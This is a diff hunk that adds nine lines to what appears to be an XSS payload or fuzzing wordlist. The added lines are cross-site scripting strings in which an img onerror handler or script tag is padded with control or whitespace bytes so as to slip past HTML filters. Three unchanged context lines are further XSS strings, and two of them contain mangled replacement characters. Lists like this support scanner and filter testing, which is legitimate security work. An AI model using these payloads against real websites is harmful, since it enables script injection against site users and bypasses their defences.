@@ -1,3 +1,12 @@
+`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
+<script>javascript:alert(1)<\x00/script>
+<img src=# onerror\x3D"javascript:alert(1)" >
 <a href=?xss=<script>>link</a>
 "><img-src%3Dy-onerror%3Dconfirm(1)>
 <a href=��?xss=<script>��>link</a>
